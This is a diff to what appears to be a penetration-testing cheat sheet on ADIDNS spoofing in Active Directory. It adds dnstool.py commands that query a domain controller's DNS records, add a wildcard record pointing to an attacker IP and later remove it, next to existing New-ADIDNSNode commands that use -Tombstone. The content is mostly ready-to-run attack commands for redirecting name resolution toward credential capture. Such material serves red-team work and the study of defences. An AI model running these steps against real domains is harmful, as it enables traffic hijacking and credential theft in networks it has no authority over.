@@ -87,8 +87,11 @@ Get-Inveigh
 #### Check WINS forward lookup
 - If WINS forward lookup is enabled then adding a wildcard record won't work.
 - https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py
+- The entry type `65281` (i.e. `WINS`) will exist if WINS forward lookup is enabled.
 ```
-dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '@' --action 'query' 'DomainController'
+dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '@' --action 'query' <DC IP>
+
+dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '@' --action 'query' <DC IP> | grep "WINS\|65281"
 ```
 
 #### Check ADIDNS permissions
@@ -109,6 +112,13 @@ Get-ADIDNSNodeAttribute -Node * -Attribute DNSRecord -Partition System
 Get-ADIDNSNodeAttribute -Node * -Attribute DNSRecord -Partition ForestDNSZones
 ```
 
+```
+dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '*' --action 'query' <DC IP>
+dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '*' --action 'query' <DC IP> --legacy
+dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '*' --action 'query' <DC IP> --forest
+dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '*' --action 'query' <DC IP> --partition
+```
+
 #### Create wildcard record
 - By default, replication between sites can take up to three hours.
 - Use `-Tombstone` so any authenticated user can perform node modifications
@@ -116,6 +126,10 @@ Get-ADIDNSNodeAttribute -Node * -Attribute DNSRecord -Partition ForestDNSZones
 New-ADIDNSNode -Node * -Data <ATTACKER IP> -Verbose
 
 New-ADIDNSNode -Node * -Data <ATTACKER IP> -Verbose -Tombstone
+```
+
+```
+dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '*' --action add --data <ATTACKER IP> <DC IP>
 ```
 
 #### Give other groups permissions to the record
@@ -137,6 +151,10 @@ Disable-ADIDNSNode -Node *
 #### Cleanup record
 ```
 Remove-ADIDNSNode -Node *
+```
+
+```
+dnstool.py -u 'DOMAIN\USER' -p 'PASSWORD' --record '*' --action remove --data <ATTACKER IP> <DC IP>
 ```
 
 #### Check DNS
